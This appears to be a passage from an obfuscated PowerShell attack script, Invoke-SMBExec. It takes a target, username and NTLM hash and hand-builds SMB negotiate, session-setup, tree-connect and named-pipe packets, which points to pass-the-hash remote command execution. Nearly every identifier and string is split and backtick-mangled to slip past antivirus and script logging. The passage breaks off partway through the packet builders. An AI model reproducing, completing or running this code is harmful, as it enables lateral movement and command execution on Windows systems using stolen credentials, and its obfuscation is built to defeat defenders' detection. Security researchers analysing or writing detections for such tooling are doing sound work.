&("{0}{2}{1}"-f'seT-','TEM','i') ('vaR'+'iABle:R'+'l6'+'o'+'T')  ([type]("{3}{1}{0}{2}{4}{6}{7}{8}{5}"-f'.dIaGN','TeM','oStI','sYS','cS','Ss','.p','Ro','Ce')  )  ; &('sV')  ("3"+"IC1") ([Type]("{0}{1}"-f'S','TrINg')  )  ;   ${S`5u2}=  [Type]("{0}{3}{2}{1}" -f 's','tEM.teXt.eNcoDIng','s','y')  ;  ${X0G`y26}  =[tYPE]("{2}{1}{3}{0}"-F 't','onV','SYsteM.c','er')  ;    &("{1}{0}"-f'M','sET-Ite') ("va"+"r"+"ia"+"bLe:q2t9"+"HD")  ([TyPe]("{1}{0}"-f 'th','MA') ); &("{2}{1}{0}"-f 'TeM','t-I','se') ("{2}{1}{0}"-f ':814','RIAbLe','va') ( [TyPE]("{5}{1}{4}{3}{0}{2}"-f 'COnVeRt','e','ER','iT','M.B','Syst') ); function inV`Oke-sm`Bexec
{

[CmdletBinding()]
param
(
    [parameter(mandAToRy=${t`RUE})][String]${T`Ar`GEt},
    [parameter(MandATOry=${tR`Ue})][String]${userNa`Me},
    [parameter(mandAtORy=${fa`l`SE})][String]${d`OMA`In},
    [parameter(MANdATory=${f`AlSe})][String]${c`Omma`Nd},
    [parameter(mAnDAtORy=${f`ALsE})][ValidateSet("Y","N")][String]${commAND`c`O`mSpEC}="Y",
    [parameter(mAndatoRy=${tR`Ue})][ValidateScript({${_}."L`ENgtH" -eq 32 -or ${_}."le`N`GTH" -eq 65})][String]${h`Ash},
    [parameter(maNDaTORy=${F`ALsE})][String]${se`RviCe},
    [parameter(mAnDatORY=${f`AlsE})][Switch]${S`mb1},
    [parameter(mandAtOry=${F`Alse})][Int]${s`Le`EP}=150
)

if(${cOmm`A`Nd})
{
    ${Smb_e`X`ECu`TE} = ${T`RUe}
}

if(${S`mb1})
{
    ${sMb_`V`eR`sIon} = ("{0}{1}" -f 'SM','B1')
}

function coNv`ERt`FrOm-PacKEtordeReD`DIC`TIO`Na`RY
{
    param(${p`A`CKeT`_O`RderE`D_`dIcTionArY})

    ForEach(${Fi`e`LD} in ${P`ACKEt`_OrDeR`Ed_D`i`CtI`OnArY}."VA`lUeS")
    {
        ${bYTe`_Ar`RAy} += ${Fi`ELD}
    }

    return ${BYte_`AR`R`AY}
}



function g`e`T-`PaCkeT`NETBiOs`SesSiO`NSE`RV`iCE()
{
    param([Int]${PAC`ket_`HEAde`R_`lEnGTH},[Int]${PACKET_da`TA`_L`EngTH})

    [Byte[]]${pAcKe`T_N`etBIo`S_SEsS`IOn_S`ER`Vice_l`EngTH} =  (&('GI') ("{1}{3}{0}{2}"-f':','V','814','ARiaBlE')).vAluE::("{2}{0}{1}"-f 't','es','GetBy').Invoke(${paCKet`_Hea`d`Er_LE`NgTh} + ${P`A`c`kEt_daTA_LenGtH})
    ${p`Ac`k`e`T_Ne`T`BIoS`_Sessi`o`N_SERvice`_Le`NGtH} = ${PacK`eT_N`etB`ios_SESSiO`N_Se`Rvic`e_LeNGTH}[2..0]

    ${PacKE`T_`NE`TBIOs`sESSIoN`s`eRvIcE} = &("{3}{0}{2}{1}"-f 'je','t','c','New-Ob') ("{0}{8}{6}{2}{5}{4}{3}{7}{1}"-f'S','y','Collec','.OrderedDiction','ed','tions.Specializ','stem.','ar','y')
    ${PaC`ket_`NETbIosS`e`sSionSEr`VI`cE}.("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{6}{4}{0}{1}{8}{5}{9}{7}{10}"-f'S','essi','NetB','I','S','nServ','O','ge_Typ','o','ice_Messa','e'),[Byte[]](0x00))
    ${PaC`Ke`T_Ne`TBi`O`sSEssI`oNsERviCE}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{7}{4}{0}{6}{2}{1}{5}"-f 'S','e_Leng','ic','NetBIOS','n','th','erv','Sessio'),[Byte[]](${PACKeT`_NET`BI`oS`_ses`SiOn_`SeRvIce_lENgTh}))

    return ${PACKe`T`_NETbIOss`Es`SIONs`erviCe}
}



function gET`-Pa`CkE`T`smBhEadEr()
{
    param([Byte[]]${PAC`Ket_cO`mm`AnD},[Byte[]]${PAck`e`T`_FLa`gS},[Byte[]]${p`ACKeT_`FlaGs2},[Byte[]]${pAC`K`et_`TreE_Id},[Byte[]]${PAckET_`PRO`C`eSs_Id},[Byte[]]${pack`Et`_uSE`R_`id})

    ${paC`k`et`_`SMBhEAder} = &("{2}{0}{1}" -f 'e','ct','New-Obj') ("{10}{8}{6}{4}{9}{3}{7}{0}{2}{1}{5}" -f 'e','ona','dDicti','s.Spec','tem.','ry','s','ialized.Order','y','Collection','S')
    ${Pac`k`e`T_SMb`HEad`eR}.("{1}{0}" -f'dd','A').Invoke(("{3}{0}{1}{2}{4}" -f'MBHeade','r_Protoc','o','S','l'),[Byte[]](0xff,0x53,0x4d,0x42))
    ${P`ACkE`T`_sMBHeAd`er}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{2}{0}{1}{4}"-f 'H','ea','MB','S','der_Command'),${paC`k`e`T_cOmmAND})
    ${p`ACk`Et_sMB`H`EAd`ER}.("{1}{0}" -f'd','Ad').Invoke(("{4}{1}{5}{6}{0}{2}{3}" -f 'r','BHeade','rorC','lass','SM','r_','E'),[Byte[]](0x00))
    ${paCKet`_SmBh`EaD`ER}.("{1}{0}" -f'dd','A').Invoke(("{2}{3}{1}{0}" -f 'd','e','SMBHeade','r_Reserv'),[Byte[]](0x00))
    ${Pa`c`KET`_S`MBHeader}.("{1}{0}"-f 'dd','A').Invoke(("{2}{3}{4}{1}{0}" -f'de','rCo','S','MBHeader','_Erro'),[Byte[]](0x00,0x00))
    ${pa`c`k`et_s`M`BHeAdEr}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{3}{1}{0}" -f 'ader_Flags','e','SM','BH'),${PaC`kE`T_fLa`gs})
    ${PaCKEt_Sm`B`hEAD`eR}.("{0}{1}" -f 'A','dd').Invoke(("{1}{3}{0}{2}" -f'lags','S','2','MBHeader_F'),${pacK`et_`Fla`GS2})
    ${pa`CKE`T_`smb`HEadER}.("{1}{0}"-f'dd','A').Invoke(("{5}{4}{3}{1}{2}{0}"-f 'High','cessI','D','eader_Pro','MBH','S'),[Byte[]](0x00,0x00))
    ${p`AcKeT_`SMBHeA`DER}.("{1}{0}"-f'd','Ad').Invoke(("{3}{4}{2}{1}{0}"-f'gnature','r_Si','ade','S','MBHe'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${pAc`Ke`T_`S`M`BHeADEr}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{3}{4}{2}" -f 'SMB','Header_Re','ved2','se','r'),[Byte[]](0x00,0x00))
    ${pACKE`T_SmBh`EA`dEr}.("{0}{1}" -f'A','dd').Invoke(("{4}{1}{2}{3}{0}"-f'D','ea','der_T','reeI','SMBH'),${pack`e`T_tREE`_id})
    ${PAcK`et_sm`Bhe`A`D`Er}.("{0}{1}"-f'Ad','d').Invoke(("{4}{5}{2}{1}{0}{3}"-f'er_Pro','ad','He','cessID','SM','B'),${pAc`KET_Pr`o`cESS_`id})
    ${p`A`CkeT_s`mBHE`AD`eR}.("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{1}" -f 'SMBHea','D','der_UserI'),${PaC`kEt_Us`Er_`ID})
    ${P`ACket_sM`B`hE`A`der}.("{1}{0}"-f'dd','A').Invoke(("{2}{4}{0}{3}{1}"-f 'eader_M','ID','SMB','ultiplex','H'),[Byte[]](0x00,0x00))

    return ${PAcK`Et`_smB`H`eadEr}
}

function gET`-PACKe`TSMbNeGOTIa`TePRo`TocoL`REq`UEsT()
{
    param([String]${PAcK`eT_VErS`I`On})

    if(${PAc`KEt`_ve`R`sIoN} -eq ("{1}{0}"-f'B1','SM'))
    {
        [Byte[]]${p`AC`ke`T_b`yTe`_cOunT} = 0x0c,0x00
    }
    else
    {
        [Byte[]]${p`Ac`kET_B`y`Te_coUnT} = 0x22,0x00  
    }

    ${paC`KE`T_`SMBnE`GOtIA`TE`p`Ro`TOC`oLReQuE`st} = &("{1}{2}{3}{0}"-f't','New','-O','bjec') ("{0}{9}{5}{7}{2}{1}{8}{6}{3}{4}" -f'Sys','eci','ns.Sp','cti','onary','.Collecti','ized.OrderedDi','o','al','tem')
    ${p`ACkET_sMB`NEgoTiaTEP`RO`T`ocol`RE`Q`U`EST}.("{0}{1}"-f 'A','dd').Invoke(("{8}{5}{2}{6}{0}{4}{3}{7}{1}" -f'rot','t','Neg','st_Word','ocolReque','MB','otiateP','Coun','S'),[Byte[]](0x00))
    ${P`ACK`ET_S`mbNeG`O`TiaTEprotOcOLReQuesT}.("{0}{1}" -f 'A','dd').Invoke(("{7}{8}{9}{10}{3}{6}{2}{5}{0}{1}{4}" -f't_','By','o','oto','teCount','lReques','c','SM','BNeg','o','tiatePr'),${PaCk`eT_`B`YtE_COunT})
    ${pA`C`k`E`T_sMbN`egoTiAt`EPrOtOcol`R`EquesT}.("{0}{1}"-f'A','dd').Invoke(("{5}{12}{0}{1}{8}{14}{11}{4}{2}{7}{17}{10}{6}{3}{15}{13}{9}{16}"-f'tiateProtocol','R','dDialec','uffe','ste','S','_B','ts_','equest_','a','ect','eque','MBNego','rm','R','rFo','t','Dial'),[Byte[]](0x02))
    ${packET_S`m`BnE`G`Oti`AteP`RotoC`olr`eQue`st}.("{0}{1}" -f 'A','dd').Invoke(("{6}{12}{4}{2}{1}{8}{3}{14}{7}{13}{0}{9}{5}{11}{10}{15}" -f'ia','e','otocolRequ','est','iatePr','ects_','SMBNego','d','st_Requ','l','ect_Na','Dial','t','D','e','me'),[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if(${p`AcKe`T_VerS`IOn} -ne ("{0}{1}" -f'SMB','1'))
    {
        ${paCKET_`SmbnegoTIaTEpRo`T`oCoL`ReQu`eST}.("{0}{1}"-f 'Ad','d').Invoke(("{17}{5}{12}{19}{1}{4}{10}{13}{3}{6}{18}{8}{2}{7}{16}{15}{9}{11}{0}{14}" -f'fferForma','t','ueste','o','i','MB','col','dDia','q','ale','a','ct_Bu','Neg','teProt','t2','cts_Di','le','S','Request_Re','o'),[Byte[]](0x02))
        ${pAcKeT_sm`BnE`go`TIAtePROtOco`LreQu`eSt}.("{0}{1}"-f'A','dd').Invoke(("{6}{8}{0}{1}{7}{4}{3}{2}{5}{10}{11}{9}"-f 'te','Pr','t','lec','RequestedDia','s','SMBNegot','otocolRequest_','ia','e2','_Dial','ect_Nam'),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        ${PaC`Ke`T_SmBNeGOT`I`At`ePrO`TOc`olreQ`UEst}.("{0}{1}"-f'Ad','d').Invoke(("{3}{10}{0}{5}{19}{15}{2}{12}{1}{14}{17}{8}{11}{13}{18}{9}{4}{16}{6}{7}"-f'egotiateP','ia','ste','SMB','B','rotocol','f','erFormat3','s_Dia','_','N','l','dD','e','lec','Reque','uf','t','ct','Request_'),[Byte[]](0x02))
        ${paCKet_`SMBnE`gOTIa`Te`PRO`TOC`OL`REqUEsT}.("{0}{1}" -f'A','dd').Invoke(("{13}{8}{1}{16}{4}{14}{3}{17}{2}{10}{7}{11}{9}{6}{15}{12}{5}{0}"-f'3','otiatePr','s','q','colR','e','alects_Dial','Requ','BNeg','stedDi','t_','e','t_Nam','SM','e','ec','oto','ue'),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return ${paCk`et_`sM`BN`eGo`T`iateprOTOcOLREqUe`st}
}

function G`eT-PAcK`etsM`BSE`S`SiO`NSeT`UpanDX`ReqUESt()
{
    param([Byte[]]${packeT_`SEcU`RIT`Y_b`Lob})

    [Byte[]]${P`AcKEt`_`BytE_`C`oUnT} =   (  &("{2}{1}{0}"-f 'bLe','VarIA','GEt-')  814 ).ValuE::("{0}{1}{2}"-f'Ge','tBy','tes').Invoke(${P`ACKEt_sec`U`RitY_B`L`Ob}."LEn`GtH")
    ${pac`KEt`_Byte_c`OuNT} = ${Pac`KET_bYtE_Co`U`NT}[0,1]
    [Byte[]]${pACkeT_SeCUri`TY_b`LOb_l`E`Ngth} =   ${8`14}::("{0}{1}{2}"-f'GetB','yt','es').Invoke(${Pac`ket_seC`Ur`iTY_`BL`Ob}."lenG`TH" + 5)
    ${PaCke`T_sE`Cu`R`IT`Y_blO`B_lEnGTH} = ${Pac`K`et_sE`CUr`ity_`BloB_`leNgTH}[0,1]

    ${Pa`Cket_`sm`BSe`sSI`on`sE`T`Upa`NdXrEQue`St} = &("{1}{2}{0}"-f'Object','N','ew-') ("{2}{1}{7}{6}{3}{5}{0}{8}{4}"-f 'eredDict','ections.Speci','System.Coll','Or','y','d','.','alized','ionar')
    ${Pa`C`kET`_S`mBs`Essi`ON`sE`T`UPaNdxreQu`EsT}.("{1}{0}"-f 'dd','A').Invoke(("{1}{5}{0}{2}{6}{3}{4}" -f 'onSet','S','up','XReque','st_WordCount','MBSessi','And'),[Byte[]](0x0c))
    ${P`AC`ket_SMBsessioN`sE`Tup`Andx`Req`UEsT}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{2}{11}{5}{9}{8}{7}{10}{6}{0}{1}{4}" -f'dXC','omman','e','SMBS','d','upAndX','n','ue','eq','R','st_A','ssionSet'),[Byte[]](0xff))
    ${Pa`cKE`T_smBSESSio`Ns`Etu`P`A`NdxReqUeSt}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{5}{2}{0}{3}{1}{6}"-f 'Re','st_R','tupAndX','que','SMB','SessionSe','eserved'),[Byte[]](0x00))
    ${pA`cK`et_sMbSesS`Io`NS`ETUPaND`X`ReQuE`st}.("{1}{0}"-f 'dd','A').Invoke(("{4}{3}{7}{0}{6}{1}{2}{8}{5}" -f'dX','u','est_AndXOf','essionSetu','SMBS','set','Req','pAn','f'),[Byte[]](0x00,0x00))
    ${PACket`_SmbSeSsIon`SET`U`pandxREqu`e`st}.("{1}{0}"-f 'dd','A').Invoke(("{5}{2}{0}{8}{6}{1}{7}{3}{9}{4}" -f 'SessionSe','uest','MB','MaxBu','er','S','eq','_','tupAndXR','ff'),[Byte[]](0xff,0xff))
    ${p`AckET_s`mBs`eSsIOnseTu`pAN`dx`ReqU`e`St}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}{4}{6}{3}{5}" -f'BS','e','SM','AndXRequest_MaxMpxCou','ss','nt','ionSetup'),[Byte[]](0x02,0x00))
    ${PAC`k`et_S`m`BSES`SiOnseTU`Pa`N`DXrEqU`esT}.("{1}{0}" -f'dd','A').Invoke(("{0}{1}{5}{4}{7}{2}{3}{6}{8}"-f 'SM','BSes','_V','C','ionS','s','Numbe','etupAndXRequest','r'),[Byte[]](0x01,0x00))
    ${PackET_s`mBses`s`ioNS`ETUpA`N`dX`REquEsT}.("{0}{1}" -f'A','dd').Invoke(("{5}{7}{6}{4}{0}{9}{3}{2}{1}{8}"-f'X','essio','S','uest_','tupAnd','SMBSes','onSe','si','nKey','Req'),[Byte[]](0x00,0x00,0x00,0x00))
    ${PAcKET_SmB`SE`SSIo`N`Se`TUPa`NdXReQ`UESt}.("{1}{0}" -f 'd','Ad').Invoke(("{8}{9}{10}{0}{7}{5}{1}{3}{2}{4}{6}"-f 'tup','que','rityB','st_Secu','lobL','XRe','ength','And','SMBSes','sion','Se'),${paC`KET_bYTe_Co`U`Nt})
    ${packET`_sM`B`SEsS`Io`Nse`TUpAnDxRe`QUEST}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{3}{1}{5}{4}" -f 'SM','_Reser','BSession','SetupAndXRequest','2','ved'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pacKE`T_SMBSES`si`ONs`ET`UPa`NdxreQ`UE`sT}.("{1}{0}" -f'dd','A').Invoke(("{6}{4}{1}{0}{5}{7}{2}{3}" -f'Setup','ession','apab','ilities','BS','AndXRequ','SM','est_C'),[Byte[]](0x44,0x00,0x00,0x80))
    ${pACKet`_sMBSesSi`onseTUpa`N`DXRequ`est}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{1}{6}{0}{3}{2}{5}" -f 'Req','ssionSet','eC','uest_Byt','SMBSe','ount','upAndX'),${Pack`et_secU`RIty_blo`B_L`E`N`Gth})
    ${pacKet_s`mbS`eSsion`se`Tup`A`NdxRe`quest}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{11}{8}{0}{5}{10}{9}{7}{4}{1}{2}{6}" -f'e','Bl','o','S','rity','tup','b','t_Secu','ionS','eques','AndXR','MBSess'),${PAckET`_seCUr`It`y_b`Lob})
    ${pA`ck`Et_S`m`BsEs`S`I`O`Nsetu`pAnDx`ReQuEST}.("{0}{1}"-f 'Ad','d').Invoke(("{7}{5}{0}{4}{3}{2}{6}{1}" -f 'essionSetu','OS','Request_N','AndX','p','MBS','ative','S'),[Byte[]](0x00,0x00,0x00))
    ${P`ACKeT`_SmBsEssION`S`eTu`PAN`d`xReQU`eSt}.("{0}{1}"-f'A','dd').Invoke(("{11}{10}{2}{0}{7}{8}{9}{3}{4}{1}{6}{5}"-f'p','eL','etu','est_Na','tiv','e','ANManag','AndX','Re','qu','essionS','SMBS'),[Byte[]](0x00,0x00))

    return ${pAC`ket`_sM`BS`EssIo`N`sE`Tup`ANdXREQu`EsT} 
}

function g`ET-`pack`ETsMbt`Ree`ConnE`cTA`NDxrE`QuEsT()
{
    param([Byte[]]${pacK`et`_`Path})

    [Byte[]]${pa`ckET_`PAT`h_LENg`TH} =   ( &("{1}{2}{0}" -f 'bLE','VaRI','a') 814 -VaLueO)::("{0}{1}"-f 'Ge','tBytes').Invoke(${pa`c`Ket_P`ATH}."Le`NGth" + 7)
    ${p`ACKe`T_`paTh_LE`NG`TH} = ${p`AcKE`T_PATH_leN`GTh}[0,1]

    ${PAcKeT_SMBTrEeC`O`N`NeCTA`N`d`XR`eQ`UE`st} = &("{0}{2}{1}" -f'New-Ob','t','jec') ("{2}{0}{8}{5}{4}{7}{6}{3}{1}" -f '.S','ary','System.Collections','tion','d.O','ialize','dDic','rdere','pec')
    ${P`A`cKET_Sm`Bt`REeCoNnECT`AndxReQueST}.("{1}{0}" -f'd','Ad').Invoke(("{7}{2}{1}{5}{3}{0}{6}{4}" -f'Req','nnec','TreeCo','X','dCount','tAnd','uest_Wor','SMB'),[Byte[]](0x04))
    ${PaC`keT`_SMBTr`EeCoN`NECtA`NdX`Requ`E`sT}.("{0}{1}" -f'Ad','d').Invoke(("{8}{3}{5}{1}{0}{2}{4}{7}{6}"-f'ctAnd','e','XReq','Tr','uest_AndXCo','eeConn','and','mm','SMB'),[Byte[]](0xff))
    ${pA`cKET`_s`Mb`T`REecONn`ec`TANd`xREQuest}.("{1}{0}" -f'd','Ad').Invoke(("{4}{8}{7}{2}{9}{0}{1}{5}{3}{6}" -f'eque','st','dX','e','SMBTreeCo','_R','served','nectAn','n','R'),[Byte[]](0x00))
    ${p`AckEt_SM`B`TREECO`NNeCTan`DxREqU`esT}.("{0}{1}"-f 'Ad','d').Invoke(("{4}{1}{6}{2}{5}{3}{0}"-f 'Offset','C','ndXReq','ndX','SMBTree','uest_A','onnectA'),[Byte[]](0x00,0x00))
    ${pa`CKet_`Sm`B`Tree`Co`NNEc`TAn`dxR`E`QueSt}.("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{5}{4}{3}{0}" -f'quest_Flags','e','SMBTre','AndXRe','t','Connec'),[Byte[]](0x00,0x00))
    ${pAc`K`e`T_`sMBT`R`E`ECo`NNECtAnDXReQ`UeST}.("{0}{1}"-f'A','dd').Invoke(("{4}{6}{1}{3}{2}{5}{0}" -f'asswordLength','Tree','AndXRe','Connect','S','quest_P','MB'),[Byte[]](0x01,0x00))
    ${P`A`cKEt`_sMbtr`eE`con`NecTand`xRE`qUest}.("{0}{1}" -f'Ad','d').Invoke(("{2}{10}{4}{3}{1}{7}{5}{6}{0}{8}{9}"-f'u','eConnectA','SM','e','r','dXRe','q','n','est_ByteCo','unt','BT'),${PacKet`_Pa`T`H`_`lEngtH})
    ${P`Acke`T_SMbTrEEc`onnEC`TANDxrEQ`Ue`St}.("{0}{1}"-f'A','dd').Invoke(("{4}{3}{1}{6}{5}{0}{2}" -f'equest_Passw','onnect','ord','MBTreeC','S','R','AndX'),[Byte[]](0x00))
    ${PacK`et`_s`MB`TR`EeCoNNECtandx`ReQU`ESt}.("{0}{1}" -f'Ad','d').Invoke(("{6}{4}{1}{2}{5}{3}{0}"-f 't_Tree','e','e','nnectAndXReques','Tr','Co','SMB'),${PAC`ket_PA`TH})
    ${pa`C`kET`_sMbtrEecONNe`c`T`An`dxr`Eq`U`est}.("{1}{0}" -f'dd','A').Invoke(("{8}{0}{7}{1}{5}{3}{4}{6}{2}" -f'reeCo','ectAnd','rvice','t_','S','XReques','e','nn','SMBT'),[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return ${pac`ket`_smbt`REE`COnneCTaNDx`R`eqUE`St}
}

function GeT-`Pack`eTSMBnt`CreaTeAn`DxR`eQ`UeST()
{
    param([Byte[]]${Pack`eT_NAMeD`_`pIPe})

    [Byte[]]${PA`C`kET_NaMEd_`Pip`e`_`LEnGth} =  ( &("{0}{1}"-f 'd','iR')  ("{2}{1}{0}"-f'14',':8','VArIABle')  ).vaLUe::("{2}{1}{0}"-f'es','etByt','G').Invoke(${PAck`E`T_nAmeD_`P`iPe}."LE`NG`Th")
    ${PaCK`et_`NamED_`pipe_LenG`Th} = ${Pac`KE`T_naM`Ed`_Pi`pe_lEn`g`Th}[0,1]
    [Byte[]]${PacKET_fil`e_Na`mE`_LE`NG`Th} =  (&("{1}{0}" -f 'eM','iT')  ('V'+'ARiAbl'+'e:'+'814') ).VAluE::("{1}{0}{2}" -f 'etBy','G','tes').Invoke(${PaCket_`NAmE`D_`p`iPe}."l`EngTh" - 1)
    ${Pac`ket_fI`L`e_`NA`ME_`le`NGTh} = ${p`A`Ck`ET_fILe`_Name`_lenG`TH}[0,1]

    ${Pac`ket_Smb`NTcreA`TE`AN`dxReQ`UESt} = &("{2}{1}{0}" -f'ect','bj','New-O') ("{0}{3}{12}{4}{1}{11}{9}{6}{10}{2}{7}{8}{5}"-f 'Sys','Spec','Order','tem','lections.','y','d','e','dDictionar','ize','.','ial','.Col')
    ${PACK`Et`_SmbNtCr`eateA`NDXreQu`Est}.("{0}{1}"-f 'A','dd').Invoke(("{3}{7}{2}{1}{5}{0}{4}{6}"-f'ordCo','ndX','eateA','SMBNTC','un','Request_W','t','r'),[Byte[]](0x18))
    ${PAcKeT_s`mb`Nt`CreATeaN`dx`R`eq`UesT}.("{1}{0}"-f'd','Ad').Invoke(("{2}{6}{3}{1}{0}{5}{7}{4}"-f 'uest_An','q','SMBNTCreat','AndXRe','nd','dXC','e','omma'),[Byte[]](0xff))
    ${P`A`ckEt`_SmBn`T`cReat`E`An`DXreqUesT}.("{1}{0}"-f 'dd','A').Invoke(("{5}{7}{3}{6}{4}{2}{0}{1}" -f'uest','_Reserved','q','TCr','e','SM','eateAndXR','BN'),[Byte[]](0x00))
    ${paCk`Et_SmbNt`CreAt`EanDX`R`equEST}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{8}{1}{0}{5}{7}{6}{2}{4}" -f 'AndXRequ','te','XOffse','SMBNT','t','e','_And','st','Crea'),[Byte[]](0x00,0x00))
    ${PaCK`et_`sM`BNtc`R`eAteAndxREQ`UesT}.("{0}{1}"-f 'A','dd').Invoke(("{3}{4}{6}{2}{0}{5}{1}" -f'st_Rese','d2','XReque','S','MBNTC','rve','reateAnd'),[Byte[]](0x00))
    ${p`AcKeT_sMb`N`T`CREA`TeA`NDXRE`QueST}.("{0}{1}" -f 'A','dd').Invoke(("{3}{4}{1}{2}{5}{0}"-f 'NameLen','eateAndX','Req','SMBNT','Cr','uest_File'),${P`A`cKet_f`ile_n`AMe_`l`ength})
    ${P`Ac`k`et_sMBNtCReAT`E`A`Ndx`R`eQ`UEST}.("{1}{0}"-f'dd','A').Invoke(("{2}{3}{6}{0}{4}{7}{5}{1}"-f'e','s','SMB','NT','quest_C','teFlag','CreateAndXR','rea'),[Byte[]](0x16,0x00,0x00,0x00))
    ${P`AC`KE`T_SM`BNtC`Reat`ea`NdXrEQu`eSt}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{3}{9}{2}{6}{8}{0}{1}{7}{4}"-f'equest_','Roo','reat','MBNT','FID','S','eAndX','t','R','C'),[Byte[]](0x00,0x00,0x00,0x00))
    ${P`AC`k`ET_SM`BNt`CREATEAN`dXrEQ`U`EsT}.("{0}{1}" -f'A','dd').Invoke(("{3}{9}{0}{6}{4}{7}{5}{8}{2}{1}"-f 'e','k','Mas','SM','eAn','Re','at','dX','quest_Access','BNTCr'),[Byte[]](0x00,0x00,0x00,0x02))
    ${pA`C`kET_`S`Mbn`TcReAteAndXRe`q`UE`st}.("{0}{1}"-f 'A','dd').Invoke(("{0}{5}{4}{3}{2}{6}{1}" -f'SMBNTCre','ocationSize','ues','eq','eAndXR','at','t_All'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${p`AcK`ET_SmbNtCrEaTE`ANDx`ReQueSt}.("{0}{1}" -f'A','dd').Invoke(("{2}{0}{4}{6}{5}{1}{3}{9}{10}{8}{7}" -f 'TCreate','F','SMBN','i','A','_','ndXRequest','ributes','t','l','eAt'),[Byte[]](0x00,0x00,0x00,0x00))
    ${p`A`CK`eT_`s`mBNtCR`EAt`eAnDxReQu`esT}.("{0}{1}"-f'Ad','d').Invoke(("{5}{1}{4}{3}{0}{2}{6}" -f 'Shar','dXRe','eAc','est_','qu','SMBNTCreateAn','cess'),[Byte[]](0x07,0x00,0x00,0x00))
    ${p`ACkEt_`Sm`B`NTcREaTE`ANDx`REQu`EsT}.("{0}{1}" -f'Ad','d').Invoke(("{2}{6}{3}{0}{1}{5}{4}"-f'ispo','sit','SM','equest_D','n','io','BNTCreateAndXR'),[Byte[]](0x01,0x00,0x00,0x00))
    ${p`A`CKEt`_SmBNT`cr`eateANDXreq`UEsT}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{4}{3}{1}{5}{7}{0}{6}" -f 'ion','re','SMBNTCreateAn','quest_C','dXRe','a','s','teOpt'),[Byte[]](0x00,0x00,0x00,0x00))
    ${paCk`e`T_S`MBnt`CrEATe`AN`DXr`eQueSt}.("{0}{1}"-f 'Ad','d').Invoke(("{6}{2}{0}{5}{3}{1}{4}" -f'BNTCreate','Request_Imperso','M','ndX','nation','A','S'),[Byte[]](0x02,0x00,0x00,0x00))
    ${paCk`ET_sMbnTcr`eAT`EanD`XREqUEST}.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{4}{0}{3}{5}{6}" -f 'q','S','MBNTCreat','uest','eAndXRe','_SecurityF','lags'),[Byte[]](0x00))
    ${pAckeT_SmB`N`TCreA`TEa`ND`xREqueST}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}{7}{4}{3}{6}{2}{5}{8}"-f 'S','MBN','e','AndXReque','te','Cou','st_Byt','TCrea','nt'),${PAc`KET`_NAmeD`_`Pi`pE_lE`NGth})
    ${PaC`Ket_S`mBnTCR`Ea`Te`AndxR`e`q`Uest}.("{1}{0}"-f'dd','A').Invoke(("{2}{1}{0}{3}{4}{5}{6}" -f 'XReque','MBNTCreateAnd','S','s','t','_Filenam','e'),${p`A`ckE`T_`NaMeD_Pipe})

    return ${PAC`Ke`T`_sMbnTCReAtE`ANd`x`Re`quE`ST}
}

function get`-p`Ackets`M`BR`eaDaNdXreQUe`sT()
{
    ${PACKet`_SMB`ReaDa`ND`X`REqUEST} = &("{1}{0}{2}"-f 'ew-Objec','N','t') ("{2}{7}{13}{6}{10}{11}{5}{4}{3}{1}{12}{8}{0}{9}" -f'nar','red','S','s.Specialized.Orde','n','ctio','em.Co','y','o','y','l','le','Dicti','st')
    ${pAck`eT_`SMb`R`EAdaN`DxR`eQ`Uest}.("{1}{0}" -f'dd','A').Invoke(("{3}{2}{7}{0}{6}{5}{1}{4}" -f'eq','st_Wor','eadA','SMBR','dCount','e','u','ndXR'),[Byte[]](0x0a))
    ${PAc`kET_s`MB`ReA`daND`XR`EQ`U`eST}.("{1}{0}"-f 'dd','A').Invoke(("{3}{5}{2}{6}{4}{1}{7}{0}" -f'and','Com','n','SM','dX','BReadA','dXRequest_An','m'),[Byte[]](0xff))
    ${Pa`Cket_S`MBrEADaNd`xREq`UESt}.("{0}{1}" -f'Ad','d').Invoke(("{2}{0}{3}{8}{4}{6}{7}{1}{5}"-f 'eadAn','_Rese','SMBR','d','e','rved','que','st','XR'),[Byte[]](0x00))
    ${pa`ckeT_S`mB`ReAdAn`Dxr`equEST}.("{1}{0}"-f'dd','A').Invoke(("{8}{0}{5}{4}{2}{7}{1}{3}{6}" -f'BRea','ndX','es','Of','AndXRequ','d','fset','t_A','SM'),[Byte[]](0x00,0x00))
    ${pACkE`T_`Smbr`eAdAND`xreq`UE`st}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{3}{1}{0}{2}{4}"-f 'XRequ','d','est_','MBReadAn','FID','S'),[Byte[]](0x00,0x40))
    ${pa`ckE`T_sM`BreaD`AnD`xrEquesT}.("{1}{0}" -f'dd','A').Invoke(("{2}{4}{1}{0}{3}" -f 'Request_Offse','X','SMBRe','t','adAnd'),[Byte[]](0x00,0x00,0x00,0x00))
